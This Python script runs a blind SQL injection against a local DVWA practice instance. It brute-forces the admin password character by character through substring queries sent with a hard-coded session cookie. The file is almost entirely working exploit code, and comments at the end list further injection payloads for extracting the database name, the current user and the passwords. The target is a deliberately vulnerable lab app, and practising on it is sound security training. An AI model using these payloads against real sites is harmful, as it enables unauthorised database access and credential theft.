import requests

characters=list('abcdefghijklmnopqrstuvwxyz' + '0123456789')
#burp0_url = "http://127.0.0.1:80/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
burp0_cookies = {"PHPSESSID": "hlt8n62beh6repfp7h2673o96l", "security": "low"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Connection": "close",
                 "Referer": "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit",
                 "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
admin_password = []
for num in range (1,6):
    for char in characters:
        burp0_url = "http://127.0.0.1:80/dvwa/vulnerabilities/sqli_blind/?id= 1'+AND+(SELECT+substring(password,{},1)+FROM+users+WHERE+user='admin')='{}&Submit=Submit".format(num,char)
        responce = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        if ('ser ID exists in the database') in responce.text:
            print(burp0_url)
            print(char)

       # if ('User ID is MISSING from the database')  in responce.text:
        #    continue
        #else:
         #   print(burp0_url)
          #  print(char)
            admin_password.append(char)
print(admin_password)

#1'+AND+substring(database(),{},1)+=+'{}'%23
#1'+AND+(SELECT+substring(password,{},1)+FROM+users+WHERE+user='admin')='{}

#1'+AND+(SELECT+SUBSTRING(password,{},1)+FROM+users+WHERE+username%3d'admin')%3d'{}
#   1'+AND+(SELECT+SUBSTRING(user(),{},1)+FROM+users)%3d'{}
#`' AND (SELECT 'a' FROM users WHERE user='admin')='a